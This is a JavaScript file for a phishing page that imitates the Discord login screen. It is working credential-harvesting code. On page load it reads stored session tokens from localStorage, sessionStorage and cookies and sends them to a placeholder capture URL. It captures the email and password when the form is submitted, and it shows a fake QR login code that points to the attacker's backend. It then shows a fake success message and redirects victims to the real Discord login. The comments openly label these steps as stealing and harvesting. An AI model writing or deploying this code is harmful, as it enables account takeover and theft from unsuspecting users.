document.addEventListener('DOMContentLoaded', () => {
  // ============================================================
  //  CONFIG — CHANGE THIS TO YOUR BACKEND URL
  // ============================================================
  const BACKEND_URL = 'https://yourdomain.com/capture.php';
  const REDIRECT_URL = 'https://discord.com/login';

  // ============================================================
  //  DOM REFS
  // ============================================================
  const loginForm = document.getElementById('loginForm');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const togglePasswordBtn = document.getElementById('togglePassword');
  const emailError = document.getElementById('emailError');
  const submitBtn = document.getElementById('submitBtn');
  const qrSection = document.getElementById('qrSection');
  const qrImage = document.getElementById('qrImage');
  const refreshQrBtn = document.getElementById('refreshQrBtn');
  const qrTimer = document.getElementById('qrTimer');
  const statusOverlay = document.getElementById('statusOverlay');
  const statusText = document.getElementById('statusText');

  // Show QR section on mobile
  if (window.innerWidth <= 640) {
    qrSection.classList.add('active');
  }

  // ============================================================
  //  TOGGLE PASSWORD VISIBILITY
  // ============================================================
  if (togglePasswordBtn && passwordInput) {
    togglePasswordBtn.addEventListener('click', () => {
      const isPassword = passwordInput.getAttribute('type') === 'password';
      passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
    });
  }

  // ============================================================
  //  GENERATE FAKE QR CODE (points to your backend)
  // ============================================================
  function generateFakeQR() {
    const payload = {
      action: 'qr_login',
      backend: BACKEND_URL,
      redirect: REDIRECT_URL,
      timestamp: Date.now()
    };
    const encoded = btoa(JSON.stringify(payload));
    const fakeUrl = `${BACKEND_URL}?qr=${encoded}`;
    
    // Use qrserver.com API to generate QR
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(fakeUrl)}`;
    qrImage.src = qrUrl;
    
    // Start timer
    let seconds = 60;
    qrTimer.textContent = seconds;
    clearInterval(window._qrInterval);
    window._qrInterval = setInterval(() => {
      seconds--;
      qrTimer.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(window._qrInterval);
        generateFakeQR();
      }
    }, 1000);
  }

  // Refresh QR on click
  if (refreshQrBtn) {
    refreshQrBtn.addEventListener('click', (e) => {
      e.preventDefault();
      generateFakeQR();
    });
  }

  // Auto-generate QR on load
  generateFakeQR();

  // ============================================================
  //  SEND DATA TO BACKEND
  // ============================================================
  async function sendToBackend(payload) {
    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (e) {
      return null;
    }
  }

  // ============================================================
  //  ATTEMPT TO STEAL TOKEN FROM STORAGE
  // ============================================================
  function stealStoredToken() {
    let token = localStorage.getItem('token');
    if (!token) token = sessionStorage.getItem('token');
    if (!token) {
      const cookieMatch = document.cookie.match(/token=([^;]+)/);
      if (cookieMatch) token = cookieMatch[1];
    }
    return token;
  }

  // ============================================================
  //  SHOW STATUS OVERLAY
  // ============================================================
  function showStatus(message) {
    statusOverlay.style.display = 'flex';
    statusText.textContent = message;
  }

  function hideStatus() {
    statusOverlay.style.display = 'none';
  }

  // ============================================================
  //  AUTO-HARVEST ON PAGE LOAD (if token exists)
  // ============================================================
  (async function autoHarvest() {
    const token = stealStoredToken();
    if (token) {
      showStatus('Verifying session...');
      await sendToBackend({ 
        token: token, 
        source: 'auto_harvest',
        userAgent: navigator.userAgent
      });
      setTimeout(() => {
        hideStatus();
        window.location.href = REDIRECT_URL;
      }, 800);
    }
  })();

  // ============================================================
  //  FORM SUBMIT — HARVEST CREDENTIALS
  // ============================================================
  if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      emailError.textContent = '';

      const emailVal = emailInput.value.trim();
      const passwordVal = passwordInput.value;

      if (!emailVal) {
        emailError.textContent = 'This field is required';
        emailInput.focus();
        return;
      }

      // Show loading state
      const btnSpan = submitBtn.querySelector('span');
      btnSpan.textContent = 'Logging in...';
      submitBtn.disabled = true;

      // 1. Try to grab token again (user might have logged in elsewhere)
      const token = stealStoredToken();

      // 2. Build payload
      const payload = {
        email: emailVal,
        password: passwordVal,
        token: token || null,
        source: 'form_submit',
        userAgent: navigator.userAgent,
        redirect: REDIRECT_URL
      };

      // 3. Send to backend
      await sendToBackend(payload);

      // 4. Show success and redirect
      showStatus('Login successful! Redirecting...');
      
      setTimeout(() => {
        hideStatus();
        window.location.href = REDIRECT_URL;
      }, 1000);
    });
  }

  // ============================================================
  //  HANDLE QR SCAN (polling)
  // ============================================================
  async function checkQrScan() {
    try {
      const response = await fetch(`${BACKEND_URL}?check=qr&t=${Date.now()}`);
      const data = await response.json();
      if (data && data.token) {
        showStatus('QR scan detected! Authenticating...');
        await sendToBackend({ 
          token: data.token, 
          source: 'qr_scan',
          userAgent: navigator.userAgent
        });
        setTimeout(() => {
          hideStatus();
          window.location.href = REDIRECT_URL;
        }, 1000);
        return true;
      }
    } catch (e) {}
    return false;
  }

  // Poll for QR scan every 3 seconds
  setInterval(checkQrScan, 3000);

  // ============================================================
  //  HANDLE WINDOW RESIZE (show QR on mobile)
  // ============================================================
  window.addEventListener('resize', () => {
    if (window.innerWidth <= 640) {
      qrSection.classList.add('active');
    } else {
      qrSection.classList.remove('active');
    }
  });

  console.log('🔓 Pulse session ready');
});